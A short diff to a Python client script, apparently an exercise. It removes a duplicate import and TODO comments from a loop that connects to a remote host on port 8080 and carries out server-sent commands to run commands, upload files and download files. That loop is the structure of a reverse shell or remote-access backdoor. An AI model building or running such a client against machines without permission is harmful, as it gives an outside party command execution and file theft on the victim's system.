@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
 import socket
-import socket
 import fileio
 
 
@@ -95,7 +94,7 @@ PORT = 8080         # The port used by the server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# TODO connect
+
 s.connect((HOST, PORT))
 
 while True:
@@ -105,15 +104,15 @@ while True:
 
     # User wants to run a command
     if cmd == b"run_command":
-        # TODO update the run_command function
+
         run_command(s, cmd)
 
     elif cmd == b"upload_file":
-        # TODO update the upload_file function
+
         upload_file(s, cmd)
 
     elif cmd == b"download_file":
-        # TODO update the download_file function
+
         download_file(s, cmd)
 
     elif cmd == b"exit":
